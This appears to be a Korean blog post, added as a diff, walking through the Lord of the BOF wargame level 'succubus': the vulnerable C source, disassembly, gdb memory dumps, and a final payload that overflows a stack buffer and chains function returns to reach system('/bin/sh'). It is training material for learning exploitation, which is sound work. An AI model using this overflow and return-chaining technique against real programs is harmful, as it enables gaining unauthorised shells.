@@ -1,0 +1,262 @@
+---
+layout: post
+title:  "[LOB]Level17. succubus"
+subtitle:   "[LOB]zombie_assassin → succubus"
+categories: Wargame[LOB]
+tags:
+- Wargame
+- LOB
+- Write-up
+---
+
+## keyword : function calls
+
+```c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - succubus
+        - calling functions continuously
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <dumpcode.h>
+
+// the inspector
+int check = 0;
+
+void MO(char *cmd)
+{
+    if(check != 4)
+    	exit(0);
+
+    printf("welcome to the MO!\n");
+
+	// olleh!
+	system(cmd);
+}
+
+void YUT(void)
+{
+    if(check != 3)
+    	exit(0);
+
+    printf("welcome to the YUT!\n");
+    check = 4;
+}
+
+void GUL(void)
+{
+    if(check != 2)
+    	exit(0);
+
+    printf("welcome to the GUL!\n");
+    check = 3;
+}
+
+void GYE(void)
+{
+	if(check != 1)
+		exit(0);
+
+	printf("welcome to the GYE!\n");
+	check = 2;
+}
+
+void DO(void)
+{
+	printf("welcome to the DO!\n");
+	check = 1;
+}
+
+main(int argc, char *argv[])
+{
+	char buffer[40];
+	char *addr;
+
+	if(argc < 2){
+		printf("argv error\n");
+		exit(0);
+	}
+
+	// you cannot use library
+	if(strchr(argv[1], '\x40')){
+		printf("You cannot use library\n");
+		exit(0);
+	}
+
+	// check address
+	addr = (char *)&DO;
+    if(memcmp(argv[1]+44, &addr, 4) != 0){
+    	printf("You must fall in love with DO\n");
+        exit(0);
+    }
+
+    // overflow!
+    strcpy(buffer, argv[1]);
+	printf("%s\n", buffer);
+
+    // stack destroyer
+	// 100 : extra space for copied argv[1]
+    memset(buffer, 0, 44);
+	memset(buffer+48+100, 0, 0xbfffffff - (int)(buffer+48+100));
+
+	// LD_* eraser
+	// 40 : extra space for memset function
+	memset(buffer-3000, 0, 3000-40);
+}
+```
+
+\x40 주소가 필터링 되어 있어 라이브러리 주소를 사용하지못한다.
+
+```c
+int memcmp(const void *s1, const void *s2, size_t n);
+```
+
+- s1의 메모리영역과  s2의 메모리 영역의 처음 n 바이트를 비교한다.
+- s1 < s2 이면 0보다 작은 정수 반환
+- s1 = s2 이면 0 반환
+- s1 > s2 이면 0보다 큰 정수 반환
+
+```c
+void *memset(void *dest, int c, size_t count);
+```
+
+- dest의 첫번째 count바이트를 값 unsigned c로 설정한다.
+- dest : 메모리의 크기를 변경할 포인터
+- c : 초기화 값
+- size : 초기화 길이
+- dest에 대한 포인터를 리턴 / 실패시 NULL 리턴
+
+
+
+```c
+// check address
+	addr = (char *)&DO;
+    if(memcmp(argv[1]+44, &addr, 4) != 0){
+    	printf("You must fall in love with DO\n");
+        exit(0);
+    }
+```
+
+```assembly
+0x8048860 <main+88>:	mov    DWORD PTR [%ebp-44],0x80487ec	#addr = &DO
+0x8048867 <main+95>:	push   4
+0x8048869 <main+97>:	lea    %eax,[%ebp-44]	#ebp-44 = &addr
+0x804886c <main+100>:	push   %eax
+0x804886d <main+101>:	mov    %eax,DWORD PTR [%ebp+12] #ebp+12 = argv[1]
+0x8048870 <main+104>:	add    %eax,4
+0x8048873 <main+107>:	mov    %edx,DWORD PTR [%eax]
+0x8048875 <main+109>:	add    %edx,44
+0x8048878 <main+112>:	push   %edx
+0x8048879 <main+113>:	call   0x804842c <memcmp>
+```
+
+&DO = 0x080487ec
+
+argv[1]의 44번째부터 4byte만큼은 addr의 주소와 비교한다.
+
+payload 시나리오 : `|dummy(44)|&DO|`
+
+> check address는 통과했으니 전역변수 check 값을 4로 만들고 MO함수를 호출하면 될 듯 😊
+
+check를 4로 만들기 위해서는 
+
+1. DO 함수를 호출하여 check = 1 만들고
+2. GYE함수를 호출하여 check = 2 만들고
+3. GUL함수를 호출하여 check = 3 만들고
+4. YUT함수를 호출하여 check = 4 만든다.
+
+최종적으로 MO함수를 호출하면 Finish!! 👌👌👌👌👌
+
+
+
+&main(ebp) : 0xbffffae8
+
+&DO : 0x80487ec
+
+&GYE : 0x80487bc
+
+&GUL : 0x804878c
+
+&YUT : 0x804875c
+
+&MO : 0x8048724
+
+payload 시나리오 : `| dummy(44) | &DO | &GYE | &GUL | &YUT | &MO |`
+
+
+
+```c
+void MO(char *cmd)
+{
+    if(check != 4)
+    	exit(0);
+
+    printf("welcome to the MO!\n");
+
+	// olleh!
+	system(cmd);
+}
+```
+
+마지막 MO 함수는 인자값으로 cmd의 주소값을 가져온다.
+
+함수의 인자값은 해당 함수의 ebp+8부터 시작된다. *(ebp+4는 RET영역)*
+
+라이브러리주소를 참조 못하므로, 다른 곳에서 "/bin/sh"를 가져와야 한다.
+
+"/bin/sh"를 가져올 수 있는 경우의 수
+
+1. 환경변수
+   - 환경변수는 main함수 밑에 arg값 밑에 환경변수가 들어간다.
+   - 해당 코드에서 buffer+48+100부분부터 0xbfffffff까지 0으로 초기화 되므로 환경변수도 초기화 된다.
+2. system함수 내부(라이브러리)
+   - system함수는 라이브러리에 존재하는데 라이브러리는 '0x40'으로 시작된다. 이는 필러링 되고 있다.
+3. main의 argv[1]
+   - argv[1] 내부에 "/bin/sh"을 입력하고 해당 주소를 넣어줄 수 있다.
+4. main의 argv[2]
+   - argv[2] 도 buffer+48+100 부분만 넘지 않으면 가능 할 것 같다.
+
+1번, 2번 방법을 불가능하므로, 3번 방법 argv[1]자체 내부에 "/bin/sh"를 넣고 해당 주소를 구해보자.
+
+`|dummy(44)|&DO|&GYE|&GUL|&YUT|&MO|dummy(4)|\xbf\xbf\xbf\xbf|"/bin/sh"|`
+
+```c
+(gdb) x/32x $ebp
+0xbffffa7c:	0x00000000	0x90909090	0xbfbfbfbf	0x6e69622f
+0xbffffa8c:	0x0068732f	0x08048808	0x00000002	0xbffffab4
+0xbffffa9c:	0x0804839c	0x0804894c	0x4000ae60	0xbffffaac
+```
+
+0xbfbfbfbf 가 들어간 이후를 보니 "'/bin/sh"문자열이 ASCII 코드로 들어가 있다. 이 주소를 구해보면 0xbffffa88 가 된다. 이 주소를 0xbfbfbfbf에 넣으면 끄읏!
+
+```python
+string = "/bin/sh"
+for x in string: 
+    hex(ord(x))
+...
+'0x2f'
+'0x62'
+'0x69'
+'0x6e'
+'0x2f'
+'0x73'
+'0x68'
+```
+
+&"/bin/sh" : 0xbffffab8
+
+payload 시나리오 :
+
+`|dummy(44)|&DO|&GYE|&GUL|&YUT|&MO|dummy(4)|\xb8\xfa\xff\xbf|"/bin/sh"|`
+
+payload :
+
+```sh
+./succubus `python -c 'print "A"*44+"\xec\x87\x04\x08"+"\xbc\x87\x04\x08"+"\x8c\x87\x04\x08"+"\x5c\x87\x04\x08"+"\x24\x87\x04\x08"+"\x90"*4+"\xb8\xfa\xff\xbf"+"/bin/sh"'`
+```
+
+
+
+**succubus / hear to stay**
